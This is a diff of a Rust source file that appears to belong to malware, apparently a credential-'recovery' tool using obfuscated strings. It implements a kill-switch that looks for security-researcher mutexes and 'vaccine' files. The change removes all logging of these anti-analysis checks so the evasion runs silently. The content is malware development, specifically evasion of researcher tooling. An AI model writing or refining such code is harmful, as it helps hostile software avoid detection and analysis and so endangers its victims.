@@ -1,17 +1,14 @@
 use crate::recovery::helpers::obfuscation::deobf;
 use std::path::Path;
-use tracing::{debug, warn};
 use windows::core::PCWSTR;
 use windows::Win32::System::Threading::{OpenMutexW, MUTEX_ALL_ACCESS};
 
 pub async fn check_killswitch() -> bool {
     if check_mutexes() {
-        warn!("kill-switch triggered: researcher mutex detected");
         return true;
     }
 
     if check_vaccine_files() {
-        warn!("kill-switch triggered: vaccine file detected");
         return true;
     }
 
@@ -46,7 +43,6 @@ fn check_mutexes() -> bool {
             if let Ok(h) = handle {
                 if !h.is_invalid() {
                     let _ = windows::Win32::Foundation::CloseHandle(h);
-                    debug!(mutex = %name, "researcher mutex found");
                     return true;
                 }
             }
@@ -67,7 +63,6 @@ fn check_vaccine_files() -> bool {
 
     for file in files {
         if Path::new(file).exists() {
-            debug!(file = %file, "vaccine file found");
             return true;
         }
     }
